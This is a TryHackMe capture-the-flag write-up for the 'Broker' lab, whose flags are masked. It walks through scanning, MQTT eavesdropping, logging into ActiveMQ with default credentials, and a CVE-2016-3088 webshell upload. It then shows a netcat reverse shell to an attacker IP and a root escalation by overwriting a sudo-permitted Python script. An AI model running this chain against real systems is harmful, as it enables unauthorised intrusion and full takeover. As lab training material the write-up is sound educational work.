# TryHackMe - Broker Challenge

## Introduction

### Challenge Overview
- **Challenge Name**: Broker
- **Difficulty**: Medium
- **Platform**: TryHackMe
- **Description**: Paul and Max use an unconventional method to chat via an ActiveMQ broker. They are unaware that eavesdropping is possible, providing an entry point for exploitation.

### Objectives
- Gain initial access to the target system.
- Escalate privileges to obtain root access.
- Capture both user and root flags.

### Tools and Environment
- **Target IP**: 10.201.90.162 (example; adjust as per deployment)
- **Attacker IP**: 10.9.1.172 (example; adjust as per deployment)
- **Tools Used**:
  - Nmap (port scanning)
  - Mosquitto (MQTT client for eavesdropping)
  - Git (for cloning exploit repository)
  - Python (for running exploit)
  - Netcat (for reverse shell)
  - Sudo (for privilege escalation)

## Reconnaissance

### Port Scanning
Performed an Nmap scan to identify open ports and services on the target.

**Command**:
```bash
nmap -sV -p- 10.201.90.162
```

**Results**:
- Port 1883: MQTT (Message Queuing Telemetry Transport)
- Port 8161: HTTP (Apache ActiveMQ Web Console)

## Enumeration

### Web Interface Discovery
Accessed the web interface on port 8161 to gather information about the ActiveMQ broker.

1. Navigate to `http://10.201.90.162:8161/`.
2. Click on "Manage ActiveMQ broker".
3. Log in using default credentials: `admin:admin`.

**Findings**:
- ActiveMQ version: 5.9.0 (inferred from copyright notice: "Copyright 2005-2013 The Apache Software Foundation.")
- Web console accessible with default credentials.

### MQTT Eavesdropping
Installed Mosquitto client to subscribe to MQTT topics and eavesdrop on communications.

**Installation**:
```bash
# Assuming on Kali Linux or similar
sudo apt update && sudo apt install mosquitto-clients
```

**Command to Subscribe**:
```bash
mosquitto_sub -t 'secret_chat/#' -h 10.201.90.162 -p 1883 -V mqttv31 --tls-version tlsv1.2
```

**Captured Messages**:
```
Max: Yeah, honestly that's the one game that got me into hacking, since I wanted to know how hacking is 'for real', you know? ;)
Paul: Sounds awesome, I will totally try it out then ^^
Max: Nice! Gotta go now, the boss will kill us if he sees us chatting here at work. This broker is not meant to be used like that lol. See ya!
```

**Analysis**:
- Users are using the broker for personal chat, indicating misuse of the service.
- No sensitive information directly leaked, but confirms active usage.

## Vulnerability Assessment

### Identified Vulnerability
- **CVE**: CVE-2016-3088
- **Description**: Apache ActiveMQ 5.x before 5.14.0 allows remote attackers to upload and execute arbitrary files via a crafted HTTP request to the file upload functionality in the web console.
- **Impact**: Remote Code Execution (RCE) leading to shell access.
- **Affected Version**: ActiveMQ 5.9.0 (confirmed from enumeration).

**Rationale**:
- Default credentials allowed access to the web console.
- Version is vulnerable to the known exploit.

## Exploitation

### Step 1: Obtain Exploit
Cloned the public exploit repository for CVE-2016-3088.

**Command**:
```bash
git clone https://github.com/vonderchild/CVE-2016-3088.git
```

**Output**:
```
Cloning into 'CVE-2016-3088'...
remote: Enumerating objects: 9, done.
remote: Counting objects: 100% (9/9), done.
remote: Compressing objects: 100% (8/8), done.
remote: Total 9 (delta 1), reused 2 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (9/9), done.
Resolving deltas: 100% (1/1), done.
```

### Step 2: Run Exploit
Executed the Python exploit to gain a webshell.

**Command**:
```bash
python3 CVE-2016–3088.py
```

**Interaction**:
```
/home/santstyle/Desktop/THM/broker/CVE-2016-3088/CVE-2016–3088.py:17: SyntaxWarning: invalid escape sequence '\/'
  path = re.search('.*\/(?!.*\/)|', resp.reason)
Enter url (e.g http://127.0.0.1:8661/): http://10.201.90.162:8161/
Enter username: admin
Enter password: admin
Shell: http://10.201.90.162:8161/admin/shell.jsp?cmd=whoami
```

**Verification**:
- Accessed `http://10.201.90.162:8161/admin/shell.jsp?cmd=whoami` in browser.
- Confirmed execution as `activemq` user.

### Step 3: Establish Reverse Shell
Used the webshell to execute a reverse shell command.

**Command via Webshell**:
```
http://10.201.90.162:8161/admin/shell.jsp?cmd=nc -e /bin/bash 10.9.1.172 4444
```

**Listener on Attacker**:
```bash
nc -lvnp 4444
```

**Output**:
```
listening on [any] 4444 ...
connect to [10.9.1.172] from (UNKNOWN) [10.201.90.162] 52776
```

## Post-Exploitation

### Initial Shell Access
Upon connecting, explored the filesystem and located the user flag.

**Commands**:
```bash
ls
cat flag.txt
```

**Output**:
```
LICENSE
NOTICE
README.txt
activemq-all-5.9.0.jar
bin
chat.py
conf
data
flag.txt
lib
start.sh
subscribe.py
tmp
webapps
THM{***********}
```

**User Flag**: `THM{***********}`

### Stabilize Shell
Upgraded the shell for better interaction.

**Commands**:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Press Ctrl+Z to background
stty raw -echo; fg
export TERM=xterm-256color
```

## Privilege Escalation

### Check Sudo Permissions
Checked for sudo privileges on the activemq user.

**Command**:
```bash
sudo -l
```

**Output**:
```
Matching Defaults entries for activemq on activemq:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User activemq may run the following commands on activemq:
    (root) NOPASSWD: /usr/bin/python3.7 /opt/apache-activemq-5.9.0/subscribe.py
```

**Analysis**:
- User can run `/opt/apache-activemq-5.9.0/subscribe.py` as root without password.
- This allows arbitrary code execution if the script can be modified.

### Exploit Sudo Misconfiguration
Modified the `subscribe.py` script to spawn a root shell.

**Commands**:
```bash
ls -la /opt/apache-activemq-5.9.0/subscribe.py
echo 'import os; os.setuid(0); os.system("/bin/sh")' > /opt/apache-activemq-5.9.0/subscribe.py
sudo /usr/bin/python3.7 /opt/apache-activemq-5.9.0/subscribe.py
```

**Verification**:
```bash
whoami
# Output: root
```

### Capture Root Flag
Navigated to root directory and captured the flag.

**Commands**:
```bash
cd /root
ls
cat root.txt
```

**Output**:
```
root.txt
THM{***********}
```

**Root Flag**: `THM{************}`

## Conclusion

### Summary of Findings
- Successfully exploited CVE-2016-3088 in Apache ActiveMQ 5.9.0 to gain initial shell access.
- Eavesdropped on MQTT communications to understand user behavior.
- Escalated privileges via misconfigured sudo permissions on a Python script.
- Captured both user and root flags.

### Lessons Learned
- Default credentials pose significant security risks.
- Misuse of services (e.g., using a message broker for chat) can lead to information disclosure.
- Sudo configurations should be audited to prevent privilege escalation.
- Regular patching and vulnerability scanning are essential for maintaining security.

### Recommendations
- Change default credentials immediately.
- Disable unnecessary services or restrict access.
- Apply security patches promptly.
- Implement least privilege principles for user accounts.

This report provides a step-by-step guide for replicating the exploitation process in a controlled environment for educational purposes.
